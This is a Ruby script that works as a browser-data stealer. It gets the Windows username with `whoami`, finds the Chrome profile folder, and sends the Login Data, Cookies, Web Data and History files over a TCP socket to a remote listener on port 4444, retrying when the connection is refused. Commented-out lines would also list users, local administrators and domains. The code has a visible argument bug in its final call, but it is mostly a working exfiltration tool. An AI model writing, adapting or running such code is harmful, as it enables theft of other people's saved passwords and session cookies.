
require 'socket'

MAX_ATTEMPTS = 5
RETRY_INTERVAL = 15 # in seconds
SIZE = 1024 * 1024 * 10

def SendFile(rHost = 'localhost', port = 4444, fileNameToSend)

  num_attempts = 0
  begin

    num_attempts += 1
    #Try to open up a connection to the server and upload the file
    <<-FileOpenInChunks
      File.open(fileNameToSend, 'rb') do |file|
        while chunk = file.read(SIZE)
          socket.write(chunk)
        end
      end
    FileOpenInChunks

    sock = TCPSocket.open(rHost, port)
    file = open(fileNameToSend, "rb")
    fileContent = file.read
    sock.puts(fileContent)
    sock.close

    puts "File #{fileNameToSend} uploaded sucessfully"

      # If there is no luck with the connection, try again few times
  rescue Errno::ECONNREFUSED # use general error handling with ::Exception => e
    if num_attempts <= MAX_ATTEMPTS
      puts "#{num_attempts}. Attempt to init TCP Connection was refused from #{rHost}:#{port}"
      puts "Retrying in #{RETRY_INTERVAL} seconds"
      sleep(RETRY_INTERVAL) # minutes * 60 seconds
      retry
    else
      # If no more attempts left, we quit
      puts "After #{MAX_ATTEMPTS} retries, no successful connection made"
    end

  end
end

#Let's save users and other info
#lt_user_list = `net user`
#lt_local_admins =  `net localgroup Administrators`
#lt_domains = `NET VIEW /DOMAIN`

#Current User and Domain

domanduser = `whoami`.split("\\")
#puts 'current user\'s domain: ' + domanduser[0]
#puts 'current user: ' + domanduser[1]

#Let's save some files, especially chrome DBs:

chrome_Path = "C:\\Users\\" + domanduser[1].chomp + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"

chrome_FileNames = { # just uncomment what's not needed
  :chrome_LoginFileName => 'Login Data',
  :chrome_WebFileName => 'Web Data',
  :chrome_CookieFileName => 'Cookies',
  :chrome_FakeFileName => 'FakeFile',
  :chrome_HistoryFileName => 'History'
}

chrome_FileNames.each_value do |chrome_File|
    # Opening file and
    # Confirming its existence : puts "Suspected file #{chrome_Path}#{chrome_File} exists"
  currentFileName = chrome_Path+chrome_File.to_s
  currentFile = File.open(currentFileName, 'rb') if File::exists?(currentFileName)
  puts "File upload session: #{currentFileName}"
  SendFile(currentFileName)
end
